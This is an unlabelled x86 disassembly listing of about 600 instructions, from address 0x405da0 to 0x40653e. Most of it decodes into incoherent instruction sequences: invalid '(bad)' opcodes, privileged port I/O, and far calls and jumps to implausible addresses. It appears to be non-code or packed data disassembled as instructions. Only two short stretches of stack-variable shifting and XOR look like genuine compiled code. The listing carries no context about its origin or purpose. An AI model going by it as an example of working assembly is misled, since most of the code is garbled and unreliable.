  405da0:	mov    eax,ds:0xa0442d69
  405da5:	mov    bh,0x36
  405da7:	mov    eax,0x5a100d3c
  405dac:	push   eax
  405dad:	loope  0x405d8b
  405daf:	fdivr  st,st(2)
  405db1:	lods   al,BYTE PTR ds:[esi]
  405db2:	jle    0x405df8
  405db4:	ds hlt 
  405db6:	cmc    
  405db7:	sbb    ebx,esi
  405db9:	pop    ss
  405dba:	xchg   ebp,eax
  405dbb:	push   ebx
  405dbc:	retf   
  405dbd:	or     eax,0xc5ba76d8
  405dc2:	push   es
  405dc3:	fsubr  QWORD PTR [edx+0x34]
  405dc6:	popf   
  405dc7:	call   0x520d:0x27265f5f
  405dce:	lds    edx,FWORD PTR [edi]
  405dd0:	lods   eax,DWORD PTR ds:[esi]
  405dd1:	sub    BYTE PTR [eax-0x6b],bh
  405dd4:	push   0xc98b7316
  405dd9:	cmp    al,0xb
  405ddb:	iret   
  405ddc:	xor    eax,0xa16c81dd
  405de1:	jb     0x405d86
  405de3:	mov    cl,0xce
  405de5:	call   0x59537d3c
  405dea:	stos   BYTE PTR es:[edi],al
  405deb:	out    0xf,al
  405ded:	adc    DWORD PTR ds:0x4ae54bb8,ecx
  405df3:	pop    ss
  405df4:	inc    ecx
  405df5:	(bad)  
  405df7:	cdq    
  405df8:	jle    0x405e70
  405dfa:	sbb    esi,DWORD PTR [ecx+0x78]
  405dfd:	fidiv  DWORD PTR [ecx+edi*4]
  405e00:	xor    DWORD PTR [eax],eax
  405e02:	arpl   WORD PTR [edx+0x1e],ax
  405e05:	jo     0x405def
  405e07:	mov    ecx,0xdfd904c5
  405e0c:	(bad)  
  405e0e:	cmp    dl,BYTE PTR [ebp-0x4b]
  405e11:	dec    ebx
  405e12:	rcl    dh,cl
  405e14:	fsub   QWORD PTR [ebx+0x3f]
  405e17:	dec    ebx
  405e18:	test   BYTE PTR [ecx+0x74],0xa1
  405e1c:	ss sub eax,0xcb85679d
  405e22:	mov    ch,0xa6
  405e24:	cmp    BYTE PTR [edi],ch
  405e26:	scas   eax,DWORD PTR es:[edi]
  405e27:	inc    ebx
  405e28:	sar    DWORD PTR [eax+0x46a5a1af],0xfb
  405e2f:	sbb    al,0x5f
  405e31:	sti    
  405e32:	push   ecx
  405e33:	sbb    BYTE PTR [edx],0x60
  405e36:	push   ebp
  405e37:	add    esi,0xfffffff8
  405e3a:	call   0xd6a:0x8694a1e3
  405e41:	fcom   st(4)
  405e43:	into   
  405e44:	cmp    eax,eax
  405e46:	sub    edx,DWORD PTR [edi+0x45f88596]
  405e4c:	leave  
  405e4d:	ins    BYTE PTR es:[edi],dx
  405e4e:	add    ch,BYTE PTR [eax+esi*8+0x4f262858]
  405e55:	xor    BYTE PTR [edi],0xe0
  405e58:	(bad)  
  405e59:	or     eax,0xc139aac2
  405e5e:	outs   dx,BYTE PTR ds:[esi]
  405e5f:	jno    0x405e6e
  405e61:	cld    
  405e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e63:	lods   eax,DWORD PTR ds:[esi]
  405e64:	dec    esi
  405e65:	add    eax,0x7b930fa2
  405e6a:	addr16 retf 0xfd57
  405e6e:	pop    eax
  405e6f:	or     al,0xe6
  405e71:	nop
  405e72:	pop    ebp
  405e73:	mov    al,0xe0
  405e75:	adc    ch,BYTE PTR [esi-0x58]
  405e78:	scas   al,BYTE PTR es:[edi]
  405e79:	rol    BYTE PTR [esi+edi*1+0x1b2c1986],cl
  405e80:	push   edx
  405e81:	cmp    BYTE PTR [esi-0x22f8ae61],cl
  405e87:	imul   esp,DWORD PTR [ebx-0x391650db],0xffffffd0
  405e8e:	fs dec edi
  405e90:	ret    0xe6d1
  405e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e94:	call   0x4fae:0xc82379a0
  405e9b:	mov    WORD PTR [edi],fs
  405e9d:	fisubr WORD PTR [eax-0x60]
  405ea0:	push   esi
  405ea1:	outs   dx,BYTE PTR ds:[esi]
  405ea2:	dec    ebp
  405ea3:	adc    dh,bl
  405ea5:	inc    ecx
  405ea6:	out    dx,eax
  405ea7:	or     DWORD PTR [edx+ebx*8+0x16ac62f2],ebp
  405eae:	jmp    0x13bdb0d3
  405eb3:	daa    
  405eb4:	js     0x405e74
  405eb6:	mov    cl,0x50
  405eb8:	scas   eax,DWORD PTR es:[edi]
  405eb9:	rcl    DWORD PTR [edi-0x726b588b],cl
  405ebf:	pop    esp
  405ec0:	aam    0x99
  405ec2:	icebp  
  405ec3:	ret    0xc792
  405ec6:	mov    ecx,DWORD PTR [ecx]
  405ec8:	push   ss
  405ec9:	sahf   
  405eca:	jg     0x405e4e
  405ecc:	or     ecx,DWORD PTR [edi+0x24c60378]
  405ed2:	in     al,dx
  405ed3:	test   al,0xe2
  405ed5:	or     edi,esp
  405ed7:	les    edx,FWORD PTR [ebp-0x67a10454]
  405edd:	dec    esp
  405ede:	cmp    ecx,ebx
  405ee0:	(bad)  
  405ee1:	push   esi
  405ee2:	ins    BYTE PTR es:[edi],dx
  405ee3:	pop    esp
  405ee4:	arpl   cx,ax
  405ee6:	pop    ebp
  405ee7:	addr16 imul esp,eax,0x6
  405eeb:	pop    eax
  405eec:	mov    ah,0x7f
  405eee:	clc    
  405eef:	cld    
  405ef0:	jo     0x405e89
  405ef2:	outs   dx,DWORD PTR ds:[esi]
  405ef3:	add    al,0xe7
  405ef5:	add    esp,DWORD PTR [edx]
  405ef7:	mov    ecx,DWORD PTR [esi-0xc]
  405efa:	retf   
  405efb:	sub    BYTE PTR [eax],bh
  405efd:	mov    edi,0x63ddc489
  405f02:	mov    ds:0x6ddb8e61,al
  405f07:	aam    0xa6
  405f09:	clc    
  405f0a:	mov    bl,0x92
  405f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f0d:	inc    esi
  405f0e:	retf   0x1cea
  405f11:	in     al,dx
  405f12:	pop    es
  405f13:	aaa    
  405f14:	enter  0x52df,0x82
  405f18:	out    dx,eax
  405f19:	shr    DWORD PTR [ecx+eiz*8-0x1],1
  405f1d:	jno    0x405f3d
  405f1f:	ss push edx
  405f21:	int    0xb9
  405f23:	ficomp DWORD PTR [esi+0xc03c268]
  405f29:	sbb    BYTE PTR [ecx+0x6e1bb228],0xaf
  405f30:	jnp    0x405f0b
  405f32:	sbb    BYTE PTR [ecx+0x2c],cl
  405f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f36:	mov    ch,0x6b
  405f38:	mov    ebx,0x2712a732
  405f3d:	ret    0x8b4e
  405f40:	(bad)  
  405f41:	fdiv   st,st(0)
  405f43:	dec    ebx
  405f44:	test   ebx,ebx
  405f46:	daa    
  405f47:	cmc    
  405f48:	hlt    
  405f49:	int3   
  405f4a:	out    0x83,eax
  405f4c:	es ret 
  405f4e:	(bad)  
  405f4f:	ror    DWORD PTR [ebp+0x2f],1
  405f52:	outs   dx,DWORD PTR ds:[esi]
  405f53:	sbb    eax,0xf8db926c
  405f58:	adc    cl,BYTE PTR [ecx-0x561c87a0]
  405f5e:	clc    
  405f5f:	xlat   BYTE PTR ds:[ebx]
  405f60:	mov    esp,DWORD PTR [edx-0x2c7069bf]
  405f66:	outs   dx,BYTE PTR ds:[esi]
  405f67:	xor    DWORD PTR [ebp-0x464b20d1],esi
  405f6d:	mov    edi,DWORD PTR [edx]
  405f6f:	mov    dl,0x7
  405f71:	mov    bl,0x88
  405f73:	jne    0x405f7c
  405f75:	pop    edi
  405f76:	xchg   esp,eax
  405f77:	jb     0x405f74
  405f79:	xchg   edx,eax
  405f7a:	pop    ebp
  405f7b:	mov    ecx,DWORD PTR [edx-0x18]
  405f7e:	add    al,0x76
  405f80:	xor    eax,eax
  405f82:	inc    ebp
  405f83:	jle    0x405fdc
  405f85:	ja     0x405ff3
  405f87:	or     ch,BYTE PTR [edi-0x2f]
  405f8a:	xor    BYTE PTR [ecx],dh
  405f8c:	xor    eax,0xf349765e
  405f91:	je     0x405f30
  405f93:	cmp    al,0x1d
  405f95:	das    
  405f96:	push   0x3c
  405f98:	sub    eax,0x5d89626d
  405f9d:	mov    ch,0x21
  405f9f:	mov    esi,0x9d266687
  405fa4:	cmp    eax,0xc591d387
  405fa9:	movhlps xmm6,xmm7
  405fac:	fistp  DWORD PTR [edi]
  405fae:	mov    ecx,0x7cf650c4
  405fb3:	add    al,0x13
  405fb5:	jl     0x405fe2
  405fb7:	gs cmp eax,0xc5429000
  405fbd:	cmp    ecx,ebp
  405fbf:	in     al,0xec
  405fc1:	cmp    al,ah
  405fc3:	push   ecx
  405fc4:	pusha  
  405fc5:	int3   
  405fc6:	add    DWORD PTR gs:[edx+ebx*4],0xa72ebb9a
  405fce:	inc    edx
  405fcf:	fistp  QWORD PTR [edx+0x6239da5a]
  405fd5:	or     DWORD PTR [esi+0x39677265],ebp
  405fdb:	adc    ah,BYTE PTR [esi]
  405fdd:	sbb    eax,0x5ffddbc7
  405fe2:	jle    0x405fed
  405fe4:	jmp    0x3ec12c40
  405fe9:	jl     0x406058
  405feb:	(bad)  
  405fec:	cmc    
  405fed:	xchg   ebp,eax
  405fee:	clc    
  405fef:	mov    ebp,0x992ce329
  405ff4:	mov    esi,0x3a392020
  405ff9:	(bad)  
  405ffa:	int    0x39
  405ffc:	ret    
  405ffd:	daa    
  405ffe:	mov    dl,0xb2
  406000:	mov    dl,BYTE PTR [edx-0x64]
  406003:	bswap  edi
  406005:	push   0x1a
  406007:	cmp    DWORD PTR [ebx+0x62],esp
  40600a:	mov    ebp,0xdfba2451
  40600f:	scas   eax,DWORD PTR es:[edi]
  406010:	inc    eax
  406011:	sub    bh,BYTE PTR [edx]
  406013:	and    esp,esi
  406015:	sbb    dh,al
  406017:	hlt    
  406018:	rcl    DWORD PTR [edi],1
  40601a:	sbb    ecx,DWORD PTR [ebx]
  40601c:	add    DWORD PTR [eax],ecx
  40601e:	popf   
  40601f:	cmp    BYTE PTR [ebp-0x32],al
  406022:	xchg   ecx,eax
  406023:	mov    edi,0x430b70f4
  406028:	fstp   st(0)
  40602a:	inc    esi
  40602b:	cmp    edx,DWORD PTR [edx+0x7d]
  40602e:	sbb    DWORD PTR [ecx+0x1fc00367],esp
  406034:	xor    DWORD PTR [edi],edi
  406036:	or     eax,0x3590cc8f
  40603b:	lock inc ebp
  40603d:	in     al,0xaa
  40603f:	imul   edi,DWORD PTR [ebx+0x15],0x5
  406043:	jmp    0x574e:0xe0fc6a29
  40604a:	push   ecx
  40604b:	lods   eax,DWORD PTR ds:[esi]
  40604c:	push   edi
  40604d:	add    BYTE PTR [eax-0x49],dh
  406050:	and    eax,0xd616880b
  406055:	repz aaa 
  406057:	iret   
  406058:	js     0x406050
  40605a:	mov    ah,0x12
  40605c:	sbb    al,0x82
  40605e:	jb     0x405fe0
  406060:	push   edx
  406061:	jp     0x40604b
  406063:	stos   DWORD PTR es:[edi],eax
  406064:	push   ebp
  406065:	hlt    
  406066:	test   eax,0x58db1b10
  40606b:	idiv   DWORD PTR [edi]
  40606d:	test   al,0x9f
  40606f:	xchg   edi,eax
  406070:	push   eax
  406071:	inc    esp
  406072:	cmp    DWORD PTR [edi],esi
  406074:	mov    ds:0x8f20999c,eax
  406079:	(bad)  
  40607a:	not    BYTE PTR [edx+ecx*1]
  40607d:	pop    ebp
  40607e:	loop   0x406075
  406080:	jno    0x4060eb
  406082:	sbb    BYTE PTR [edx+0x35],cl
  406085:	push   eax
  406086:	mov    esp,0x7bee0ef4
  40608b:	pop    es
  40608c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40608d:	icebp  
  40608e:	shl    DWORD PTR [ebp-0x74e50af7],cl
  406094:	adc    bh,dl
  406096:	cs js  0x4060ce
  406099:	loop   0x406092
  40609b:	leave  
  40609c:	(bad)  
  40609d:	js     0x4060af
  40609f:	push   esp
  4060a0:	lods   eax,DWORD PTR ds:[esi]
  4060a1:	shl    DWORD PTR [eax],cl
  4060a3:	cwde   
  4060a4:	sub    edx,DWORD PTR [edi+0x27]
  4060a7:	je     0x4060a2
  4060a9:	lock nop
  4060ab:	hlt    
  4060ac:	jmp    0xe5a32f5c
  4060b1:	arpl   di,dx
  4060b3:	jbe    0x406051
  4060b5:	stos   BYTE PTR es:[edi],al
  4060b6:	lea    edx,[edx-0x13288667]
  4060bc:	jne    0x40613d
  4060be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060bf:	xor    edx,DWORD PTR [eax+0x5249c2fb]
  4060c5:	das    
  4060c6:	scas   eax,DWORD PTR es:[edi]
  4060c7:	je     0x40612e
  4060c9:	aad    0xfd
  4060cb:	scas   eax,DWORD PTR es:[edi]
  4060cc:	jp     0x406110
  4060ce:	loope  0x406058
  4060d0:	cmp    al,0xe3
  4060d2:	inc    esi
  4060d3:	div    BYTE PTR [esi]
  4060d5:	dec    esp
  4060d7:	inc    ebx
  4060d8:	int    0x26
  4060da:	jle    0x40611c
  4060dc:	lods   eax,DWORD PTR ds:[esi]
  4060dd:	sub    al,0xcf
  4060df:	sbb    dh,BYTE PTR [ebx-0x42b0f09b]
  4060e5:	leave  
  4060e6:	mov    ds:0x84ca0106,eax
  4060eb:	xchg   esi,eax
  4060ec:	jb     0x406081
  4060ee:	pop    edi
  4060ef:	xchg   edi,eax
  4060f0:	adc    BYTE PTR [ecx-0x1ece3e3a],dl
  4060f6:	push   eax
  4060f7:	lea    eax,[ebp+eax*1-0x4]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	hlt    
  40612d:	pop    ebp
  40612e:	jge    0x4060e0
  406130:	js     0x4060d5
  406132:	sbb    BYTE PTR [eax],bl
  406134:	sahf   
  406135:	adc    bl,BYTE PTR [eax]
  406137:	sbb    BYTE PTR [eax+0x4c],dl
  40613a:	fwait
  40613b:	das    
  40613c:	add    eax,edx
  40613e:	push   ecx
  40613f:	(bad)  
  406140:	push   0x74fbd634
  406145:	popa   
  406146:	js     0x406118
  406148:	into   
  406149:	mov    al,0x23
  40614b:	cld    
  40614c:	inc    ecx
  40614d:	mul    DWORD PTR [esi+eax*1]
  406150:	push   edx
  406151:	in     al,dx
  406152:	call   0xf779:0x133db2b5
  406159:	jbe    0x406156
  40615b:	(bad)  
  40615c:	mov    eax,ds:0x4a28cca4
  406161:	pop    esi
  406162:	dec    esp
  406163:	mov    ah,0x9c
  406165:	and    cl,dl
  406167:	out    0x22,al
  406169:	leave  
  40616a:	or     dh,ch
  40616c:	cld    
  40616d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40616e:	inc    ecx
  40616f:	push   ebx
  406170:	pop    ebx
  406171:	mov    ?,eax
  406173:	idiv   DWORD PTR [edi-0x2a]
  406176:	retf   0x25ae
  406179:	ror    BYTE PTR [edx+ebp*1+0x77153d46],1
  406180:	pop    eax
  406181:	pop    edi
  406182:	xor    al,0x91
  406184:	dec    esp
  406185:	adc    al,0xf5
  406187:	push   ds
  406188:	adc    DWORD PTR [edi],edi
  40618a:	sbb    BYTE PTR [eax-0x24565d95],ah
  406190:	ins    BYTE PTR es:[edi],dx
  406191:	cmp    edi,edx
  406193:	adc    ch,BYTE PTR [esp+ecx*4]
  406196:	sub    al,0xe7
  406198:	loopne 0x40615b
  40619a:	call   0x3b7c1e20
  40619f:	sbb    eax,0x96746db1
  4061a4:	mov    ebx,0xe30a3bd5
  4061a9:	or     ecx,ecx
  4061ab:	mov    edi,0x634dab68
  4061b0:	fsub   QWORD PTR [ecx+0x4d]
  4061b3:	js     0x406224
  4061b5:	inc    ebx
  4061b6:	jne    0x4061d8
  4061b8:	ret    0xe19
  4061bb:	adc    BYTE PTR [edx-0xf05350c],ah
  4061c1:	aaa    
  4061c2:	mov    bl,0x2e
  4061c4:	aas    
  4061c5:	lahf   
  4061c6:	adc    eax,0x4d6741de
  4061cb:	push   eax
  4061cc:	push   cs
  4061cd:	push   ecx
  4061ce:	mov    eax,gs
  4061d0:	mov    al,0xb4
  4061d2:	outs   dx,BYTE PTR ds:[esi]
  4061d3:	lds    ecx,FWORD PTR [esi+0x32]
  4061d6:	loop   0x40618c
  4061d8:	jbe    0x406191
  4061da:	lods   eax,DWORD PTR ds:[esi]
  4061db:	test   edx,ecx
  4061dd:	outs   dx,DWORD PTR ds:[esi]
  4061de:	or     eax,0xbbcb79a5
  4061e3:	call   0x27a9262c
  4061e8:	ror    DWORD PTR [eax+0x4b2b2cae],1
  4061ee:	add    bh,BYTE PTR [ecx-0x6f]
  4061f1:	in     al,0xd3
  4061f3:	push   es
  4061f4:	call   0x4272b68f
  4061f9:	xor    eax,0x56d5e810
  4061fe:	sbb    dh,BYTE PTR [ecx-0x5a]
  406201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406203:	jmp    0xb4ed1bd8
  406208:	ret    0x9b08
  40620b:	xchg   esi,eax
  40620c:	js     0x406204
  40620e:	push   edx
  40620f:	lods   al,BYTE PTR ds:[esi]
  406210:	xchg   edx,eax
  406211:	pop    ds
  406212:	xor    DWORD PTR [esi+0x7b],ebp
  406215:	add    BYTE PTR [esi],ch
  406217:	repnz cmc 
  406219:	dec    ebx
  40621a:	enter  0x5fac,0x78
  40621e:	xor    BYTE PTR [ecx+0x4002ae6a],dh
  406224:	jne    0x4061ae
  406226:	push   ebp
  406227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406228:	jmp    0xa032:0x6d6cf0d0
  40622f:	fmul   DWORD PTR [edx-0x21]
  406232:	add    esi,ebp
  406234:	(bad)  
  406235:	xor    dl,BYTE PTR gs:0x7e6ba2ec
  40623c:	xor    al,0xef
  40623e:	ss das 
  406240:	inc    esi
  406241:	add    dl,BYTE PTR [edi+0x2a]
  406244:	loope  0x40620f
  406246:	jnp    0x4062a4
  406248:	(bad)  
  406249:	xchg   ecx,eax
  40624a:	jmp    0x406239
  40624c:	nop
  40624d:	cmp    dh,BYTE PTR [ebx]
  40624f:	in     al,0x11
  406251:	push   edi
  406252:	pop    ds
  406253:	pop    ss
  406254:	loopne 0x406279
  406256:	mov    ebx,0xefc0262f
  40625b:	sbb    ch,cl
  40625d:	call   0xb85ec398
  406262:	sbb    ecx,esp
  406264:	aaa    
  406265:	adc    al,BYTE PTR [eax]
  406267:	mul    DWORD PTR [edi]
  406269:	sti    
  40626a:	fs das 
  40626c:	sbb    dl,BYTE PTR [esi-0x131b98c3]
  406272:	push   ds
  406273:	dec    esi
  406274:	js     0x406278
  406276:	leave  
  406277:	mov    bl,0x75
  406279:	mov    ds:0x75c34a73,al
  40627e:	call   DWORD PTR [ecx-0x3a]
  406281:	bound  edx,QWORD PTR [esi]
  406283:	jno    0x4062d3
  406285:	adc    al,0x3
  406287:	rcr    DWORD PTR [ebp-0x558dbcc],0xea
  40628e:	push   esi
  40628f:	out    dx,al
  406290:	in     al,dx
  406291:	jge    0x4062ca
  406293:	or     ah,bl
  406295:	shr    eax,cl
  406297:	mov    ds,edi
  406299:	xor    DWORD PTR [esi-0x165c5584],eax
  40629f:	fdiv   QWORD PTR [eax+0x5e]
  4062a2:	loope  0x40628f
  4062a4:	mov    cl,0xd
  4062a6:	jmp    0x406241
  4062a8:	sub    esi,ebx
  4062aa:	xor    BYTE PTR [ebx-0x51ebdcf4],dh
  4062b0:	ffreep st(5)
  4062b2:	arpl   WORD PTR [ebx+0x60],di
  4062b5:	cld    
  4062b6:	js     0x40627d
  4062b8:	mov    ch,0x2f
  4062ba:	dec    ecx
  4062bb:	jg     0x406254
  4062bd:	inc    ebp
  4062be:	jmp    0x406244
  4062c0:	ds pop esi
  4062c2:	(bad)  
  4062c3:	dec    esi
  4062c4:	rcr    DWORD PTR [ebx-0x53c3062d],1
  4062ca:	out    0xf7,eax
  4062cc:	test   eax,0x592d6777
  4062d1:	xchg   DWORD PTR [ebx+0x5ff9ec60],ebx
  4062d7:	icebp  
  4062d8:	pop    eax
  4062d9:	dec    esp
  4062da:	jo     0x4062c4
  4062dc:	das    
  4062dd:	popf   
  4062de:	mov    ah,0xad
  4062e0:	pop    ss
  4062e1:	cs xchg ebp,eax
  4062e3:	bnd jb 0x4062af
  4062e6:	int3   
  4062e7:	xchg   ebx,eax
  4062e8:	imul   edx,DWORD PTR [ecx+0x599790b9],0x9a1110a0
  4062f2:	outs   dx,BYTE PTR ds:[esi]
  4062f3:	sub    dh,dl
  4062f5:	pop    eax
  4062f6:	or     eax,0xd00a9895
  4062fb:	aad    0xde
  4062fd:	jbe    0x406373
  4062ff:	mov    ebx,0xbacf5642
  406304:	sub    BYTE PTR [edx],0x71
  406307:	lahf   
  406308:	push   ebx
  406309:	mov    ebp,0x53ee01cc
  40630e:	cmp    bh,cl
  406310:	push   ds
  406311:	sahf   
  406312:	mov    ah,0x9a
  406314:	in     al,0x70
  406316:	sub    DWORD PTR [eax+0x71],esp
  406319:	inc    ebx
  40631a:	or     DWORD PTR [ecx+0x47711925],esp
  406320:	lds    ecx,FWORD PTR [edx+0x7c]
  406323:	mov    ch,0x77
  406325:	sub    DWORD PTR [esi-0x6deabc1a],edi
  40632b:	inc    ecx
  40632c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40632d:	fsubr  DWORD PTR [ebp-0x3e]
  406330:	es or  al,0xe8
  406333:	lods   eax,DWORD PTR ds:[esi]
  406334:	retf   0x6cf
  406337:	pop    esp
  406338:	pusha  
  406339:	cmp    al,0xe7
  40633b:	mov    ecx,0xa8378001
  406340:	add    eax,DWORD PTR [ecx]
  406342:	shr    BYTE PTR [ebx-0x33],0x8a
  406346:	push   0xffffffa7
  406348:	stos   DWORD PTR es:[edi],eax
  406349:	add    al,0x8d
  40634b:	mov    edx,0xb4339c4a
  406350:	mov    BYTE PTR [ebp+0x2545f7b1],ch
  406356:	jbe    0x406394
  406358:	or     DWORD PTR [edi+ebx*4+0x3f],ecx
  40635c:	in     al,0x82
  40635e:	cmc    
  40635f:	jo     0x406324
  406361:	outs   dx,BYTE PTR ds:[esi]
  406362:	fistp  QWORD PTR [edx-0x6b]
  406365:	or     eax,0xfe136713
  40636a:	xor    DWORD PTR [edi],eax
  40636c:	into   
  40636d:	es dec eax
  40636f:	sub    al,0x7e
  406371:	inc    ecx
  406372:	dec    ebx
  406373:	lahf   
  406374:	mov    WORD PTR [ebx-0xe],es
  406377:	and    al,0xef
  406379:	xchg   bh,bh
  40637b:	pop    ss
  40637c:	sbb    al,0xd4
  40637e:	xchg   edx,eax
  40637f:	cld    
  406380:	sbb    dl,BYTE PTR [ebx-0x4c]
  406383:	jmp    0x115a:0x876f4821
  40638a:	or     DWORD PTR [eax],ebp
  40638c:	mov    BYTE PTR gs:[eax-0x227ef196],cl
  406393:	xor    eax,0xe75f08c3
  406398:	mov    ecx,0x9143dbe9
  40639d:	adc    BYTE PTR [ebp-0x6713153f],dl
  4063a3:	xchg   esp,eax
  4063a4:	jnp    0x4063e3
  4063a6:	out    0x5,eax
  4063a8:	ss test eax,0xc8162b2d
  4063ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063af:	add    edx,DWORD PTR [ebx]
  4063b1:	lock out dx,al
  4063b3:	dec    esp
  4063b5:	test   BYTE PTR [ebx-0x2f],dl
  4063b8:	sub    al,0xed
  4063ba:	jp     0x40638a
  4063bc:	pop    ebp
  4063bd:	inc    ebp
  4063be:	or     bl,BYTE PTR [eax+edx*8+0x4fae6a46]
  4063c5:	nop
  4063c6:	jns    0x40642b
  4063c8:	inc    edi
  4063c9:	xor    DWORD PTR [edi+eiz*2+0x2f3bf6c2],0x30
  4063d1:	add    DWORD PTR [edi],0x345dc8d
  4063d7:	pop    ecx
  4063d8:	sahf   
  4063d9:	pop    esi
  4063da:	dec    esi
  4063db:	jae    0x40638c
  4063dd:	std    
  4063de:	mov    dl,0xdb
  4063e0:	outs   dx,DWORD PTR ds:[esi]
  4063e1:	clc    
  4063e2:	leave  
  4063e3:	out    0x1c,eax
  4063e5:	popf   
  4063e6:	jo     0x406371
  4063e8:	lods   eax,DWORD PTR ds:[esi]
  4063e9:	or     eax,0xc7640ca9
  4063ee:	xor    eax,DWORD PTR [edx+ebp*4]
  4063f1:	push   esp
  4063f2:	sbb    ebp,DWORD PTR ds:0x2cad4f40
  4063f8:	pop    ebp
  4063f9:	(bad)  
  4063fa:	in     al,dx
  4063fb:	push   0x79
  4063fd:	div    DWORD PTR [ebx]
  4063ff:	out    0x8,al
  406401:	aad    0xff
  406403:	int3   
  406404:	addr16 xchg ebp,eax
  406406:	test   eax,0xa606ab7e
  40640b:	mov    ds:0x25df177b,al
  406410:	aam    0xd5
  406412:	jnp    0x4063a0
  406414:	(bad)
  406417:	inc    esi
  406418:	cmp    eax,0x7756b01a
  40641d:	loope  0x40648c
  40641f:	and    DWORD PTR [edx],edi
  406421:	ja     0x40646a
  406423:	inc    esi
  406424:	mov    dh,0x57
  406426:	and    al,0x8
  406428:	lahf   
  406429:	xchg   edx,eax
  40642a:	push   edx
  40642b:	fsubr  DWORD PTR [eax-0x514c766b]
  406431:	icebp  
  406432:	push   ebp
  406433:	and    esp,DWORD PTR [ebx-0x601ecce3]
  406439:	add    BYTE PTR [edx+ecx*1],ch
  40643c:	es jae 0x40649d
  40643f:	inc    eax
  406440:	shl    DWORD PTR ds:0x59926c44,cl
  406446:	stos   DWORD PTR es:[edi],eax
  406447:	sub    al,BYTE PTR [edi-0x45]
  40644a:	inc    eax
  40644b:	jmp    0xd40a115d
  406450:	popf   
  406451:	sub    cl,BYTE PTR [ebx]
  406453:	popa   
  406454:	ss es daa 
  406457:	mov    bh,0x6f
  406459:	push   es
  40645a:	je     0x4064b1
  40645c:	popf   
  40645d:	xchg   BYTE PTR [ebp+edx*1+0x6261d15a],dl
  406464:	mov    BYTE PTR [edx+esi*2-0x11033b76],ah
  40646b:	inc    edi
  40646c:	jno    0x4063f4
  40646e:	cs dec edi
  406470:	inc    ecx
  406471:	lock mov WORD PTR [ecx-0x19],ss
  406475:	push   ds
  406476:	inc    ebp
  406477:	push   esp
  406478:	mov    edi,0x48394782
  40647d:	repz aas 
  40647f:	loope  0x4064db
  406481:	gs scas al,BYTE PTR es:[edi]
  406483:	inc    ebx
  406484:	in     al,0x1b
  406486:	jbe    0x4064e7
  406488:	jmp    0x4064cf
  40648a:	outs   dx,BYTE PTR ds:[esi]
  40648b:	(bad)  
  40648c:	stc    
  40648d:	test   BYTE PTR [eax+edi*1],cl
  406490:	fmul   QWORD PTR [ecx]
  406492:	lock mov edi,esi
  406495:	push   edi
  406496:	cdq    
  406497:	inc    edx
  406499:	loop   0x406474
  40649b:	call   0xa30d:0x9dbd1b90
  4064a2:	xchg   ecx,eax
  4064a3:	jge    0x406436
  4064a5:	popa   
  4064a6:	xchg   ebx,eax
  4064a7:	cmp    DWORD PTR [esi+0x3e],eax
  4064aa:	scas   al,BYTE PTR es:[edi]
  4064ab:	sbb    DWORD PTR [edi+ebp*1+0x3b],0x85279986
  4064b3:	add    ch,BYTE PTR [edi-0x3d80d82e]
  4064b9:	into   
  4064ba:	test   al,0xce
  4064bc:	mov    bl,0x39
  4064be:	enter  0x3b31,0xdb
  4064c2:	test   BYTE PTR [ebp+0xc],bh
  4064c5:	cli    
  4064c6:	mov    ah,0xc8
  4064c8:	in     al,0x71
  4064ca:	pop    ecx
  4064cb:	jecxz  0x40651e
  4064cd:	mov    al,ds:0xc95176dc
  4064d2:	adc    al,cl
  4064d4:	mov    al,0xbe
  4064d6:	sub    edi,DWORD PTR [edx+esi*2-0x4b]
  4064da:	push   edi
  4064db:	(bad)  [edi]
  4064dd:	and    ch,BYTE PTR [eax+ebp*2+0xab4e3a7]
  4064e4:	fsub   st,st(0)
  4064e6:	sub    al,0xc1
  4064e8:	icebp  
  4064e9:	fmul   DWORD PTR [edx+edx*4]
  4064ec:	mov    esp,0xd6435c7e
  4064f1:	cdq    
  4064f2:	pushw  es
  4064f4:	lods   eax,DWORD PTR ds:[esi]
  4064f5:	outs   dx,BYTE PTR ds:[esi]
  4064f6:	xchg   esi,eax
  4064f7:	adc    al,BYTE PTR [ebx+ecx*1]
  4064fa:	ret    0xc8a
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
